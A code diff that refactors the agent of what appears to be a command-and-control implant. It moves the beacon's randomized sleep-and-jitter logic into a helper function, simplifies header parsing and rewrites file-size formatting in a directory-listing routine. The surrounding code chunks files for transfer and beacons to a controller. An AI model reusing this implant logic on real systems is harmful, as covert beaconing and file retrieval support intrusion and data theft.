@@ -73,8 +73,7 @@ headers = {"User-Agent": userAgent}
 # parse the headers into the global header dictionary
 for headerRaw in headersRaw:
     try:
-        headerKey = headerRaw.split(":")[0]
-        headerValue = headerRaw.split(":")[1]
+        headerKey, headerValue = headerRaw.split(":")[:2]
 
         if headerKey.lower() == "cookie":
             headers["Cookie"] = "%s;%s" % (headers["Cookie"], headerValue)
@@ -334,15 +333,7 @@ def process_packet(packetType, data, resultID):
 
                 global delay
                 global jitter
-                if jitter < 0:
-                    jitter = -jitter
-                if jitter > 1:
-                    jitter = old_div(1, jitter)
-
-                minSleep = int((1.0 - jitter) * delay)
-                maxSleep = int((1.0 + jitter) * delay)
-                sleepTime = random.randint(minSleep, maxSleep)
-                time.sleep(sleepTime)
+                time.sleep(sleep_time(jitter))
                 partIndex += 1
                 offset += 512000
 
@@ -1086,15 +1077,16 @@ def directory_listing(path):
         group = grp.getgrgid(fstat.st_gid)[0]
 
         # Convert file size to MB, KB or Bytes
-        if fstat.st_size > 1024 * 1024:
-            fsize = math.ceil(old_div(fstat.st_size, (1024 * 1024)))
-            unit = "MB"
-        elif fstat.st_size > 1024:
-            fsize = math.ceil(old_div(fstat.st_size, 1024))
+        fsize = fstat.st_size
+        unit = "B"
+
+        if fsize > 1024:
+            fsize >>= 10
             unit = "KB"
-        else:
-            fsize = fstat.st_size
-            unit = "B"
+
+        if fsize > 1024:
+            fsize >>= 10
+            unit = "MB"
 
         mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))
 
@@ -1185,6 +1177,18 @@ def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
         return data
 
 
+def sleep_time(jitter):
+    # Determines the random sleep duration using the delay and jitter
+    if jitter < 0:
+        jitter = -jitter
+    if jitter > 1:
+        jitter = old_div(1, jitter)
+
+    minSleep = int((1.0 - jitter) * delay)
+    maxSleep = int((1.0 + jitter) * delay)
+    return random.randint(minSleep, maxSleep)
+
+
 ################################################
 #
 # main agent functionality
@@ -1227,15 +1231,7 @@ while True:
             agent_exit()
 
         # sleep for the randomized interval
-        if jitter < 0:
-            jitter = -jitter
-        if jitter > 1:
-            jitter = old_div(1, jitter)
-        minSleep = int((1.0 - jitter) * delay)
-        maxSleep = int((1.0 + jitter) * delay)
-
-        sleepTime = random.randint(minSleep, maxSleep)
-        time.sleep(sleepTime)
+        time.sleep(sleep_time(jitter))
 
         (code, data) = send_message()
 
